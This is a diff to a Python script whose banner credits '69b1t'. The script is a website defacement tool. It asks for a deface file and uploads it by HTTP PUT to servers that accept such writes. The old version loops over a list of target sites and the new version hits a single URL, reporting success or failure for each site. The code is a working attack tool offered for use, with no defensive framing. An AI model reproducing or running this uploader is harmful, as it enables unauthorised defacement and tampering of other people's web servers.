@@ -5,7 +5,7 @@ try:
     import os.path
     import sys
 except ImportError:
-    exit("install requests and try again ...")
+    exit("Install requests and try again ...")
 
 banner = """
 888b     d888                                 888           .d888                          
@@ -21,73 +21,59 @@ banner = """
                                                                                 by-69b1t
              Coded By :- 69b1t
  Github   :-www.github.com/69b1t
- 
-
- """
+"""
 
 b = '\033[31m'
 h = '\033[32m'
 m = '\033[00m'
 
-
-def x(tetew):
+def x(prompt):
     ipt = ''
     if sys.version_info.major > 2:
-        ipt = input(tetew)
+        ipt = input(prompt)
     else:
-        ipt = raw_input(tetew)
+        ipt = raw_input(prompt)
 
     return str(ipt)
 
-
-def aox(script, target_file):
+def aox(script, target_url):
     op = open(script, "r").read()
     try:
-        with open(target_file, "r") as target:
-            target = target.readlines()
-            s = requests.Session()
-            print("uploading file to %d website" % (len(target)))
-            for web in target:
-                try:
-                    site = web.strip()
-                    if not site.startswith("http://"):
-                        site = "http://" + site
-                    req = s.put(site + "/" + script, data=op)
-                    if req.status_code < 200 or req.status_code >= 250:
-                        print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
-                    else:
-                        print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))
-
-                except requests.exceptions.RequestException:
-                    continue
-                except KeyboardInterrupt:
-                    print()
-                    exit()
-    except IOError:
-        print("Error: Could not open or read the file:", target_file)
-
-
-def main(__bn__):
-    print(__bn__)
-    while True:
+        s = requests.Session()
+        print("Uploading file to %s" % (target_url))
         try:
-            a = x("Enter your script deface name: ")
-            if not os.path.isfile(a):
-                print("File '%s' not found" % (a))
-                continue
+            if not target_url.startswith("http://"):
+                target_url = "http://" + target_url
+            req = s.put(target_url + "/" + script, data=op)
+            if req.status_code < 200 or req.status_code >= 250:
+                print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (target_url, script))
             else:
-                break
+                print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (target_url, script))
+
+        except requests.exceptions.RequestException:
+            print("An error occurred during the request to %s" % (target_url))
         except KeyboardInterrupt:
             print()
             exit()
 
-    target_file = x("Enter the target file name (e.g., liste.txt): ")
-    if not os.path.isfile(target_file):
-        print("File '%s' not found" % (target_file))
+    except IOError:
+        print("Error: Could not open or read the file:", script)
+
+def main(__bn__):
+    print(__bn__)
+    try:
+        a = x("Enter your script deface name: ")
+        if not os.path.isfile(a):
+            print("File '%s' not found" % (a))
+            exit()
+        
+        target_url = x("Enter the target URL (e.g., http://example.com): ")
+
+        aox(a, target_url)
+    
+    except KeyboardInterrupt:
+        print()
         exit()
-
-    aox(a, target_file)
-
 
 if __name__ == "__main__":
     main(banner)
